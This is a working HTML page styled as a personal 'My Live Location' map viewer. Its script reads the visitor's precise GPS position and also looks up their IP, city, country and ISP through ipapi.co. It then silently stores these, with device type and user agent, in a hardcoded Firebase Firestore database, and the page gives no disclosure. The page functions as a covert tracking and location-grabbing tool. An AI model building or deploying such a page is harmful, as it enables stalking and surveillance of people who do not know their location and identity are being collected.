<!DOCTYPE html>
<html>
<head>

<title>Live Location Tracker</title>

<meta name="viewport" content="width=device-width, initial-scale=1">

<link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css"/>

<style>

body{
font-family:Arial;
background:#f4f6fb;
margin:0;
text-align:center;
}

header{
background:#ff4b5c;
color:white;
padding:20px;
font-size:28px;
}

#map{
height:420px;
width:90%;
margin:auto;
margin-top:20px;
border-radius:10px;
}

.info{
margin-top:15px;
font-size:18px;
}

</style>

</head>

<body>

<header>
📍 My Live Location
</header>

<div class="info" id="status">Please Wait...</div>

<div id="map"></div>

<script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>

<script type="module">

import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
import { getFirestore, addDoc, collection } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";

const firebaseConfig = {
apiKey: "AIzaSyAilTyrtwRg5nQ-LpTJkhHiBn33JV14Zbc",
authDomain: "location-tracker-bba55.firebaseapp.com",
projectId: "location-tracker-bba55",
storageBucket: "location-tracker-bba55.appspot.com",
messagingSenderId: "951484366467",
appId: "1:951484366467:web:2e936d42b1704027f665b6"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

var map = L.map('map').setView([23.8103,90.4125],10);

L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{
maxZoom:19
}).addTo(map);

function detectDevice(){

let ua = navigator.userAgent;

if(/mobile/i.test(ua)) return "Mobile";
if(/tablet/i.test(ua)) return "Tablet";
return "Desktop";

}

async function saveLocation(lat, lon){

let ip="unknown"
let city="unknown"
let country="unknown"
let country_code="unknown"
let isp="unknown"

try{

let response = await fetch("https://ipapi.co/json/",{
timeout:3000
})

let data = await response.json()

ip=data.ip
city=data.city
country=data.country_name
country_code=data.country_code
isp=data.org

}catch(e){
console.log("IP lookup failed")
}

let flag="https://flagcdn.com/48x36/"+country_code.toLowerCase()+".png"

await addDoc(collection(db,"locations"),{

latitude:lat,
longitude:lon,
time:new Date().toISOString(),

ip:ip,
city:city,
country:country,
country_code:country_code,
flag:flag,
isp:isp,

device:detectDevice(),
userAgent:navigator.userAgent

})

}

navigator.geolocation.getCurrentPosition(function(position){

let lat = position.coords.latitude;
let lon = position.coords.longitude;

document.getElementById("status").innerHTML =
"Latitude: "+lat+" | Longitude: "+lon;

map.setView([lat,lon],15);

L.marker([lat,lon]).addTo(map);

saveLocation(lat,lon);

},{
enableHighAccuracy:true
});

</script>

</body>
</html>
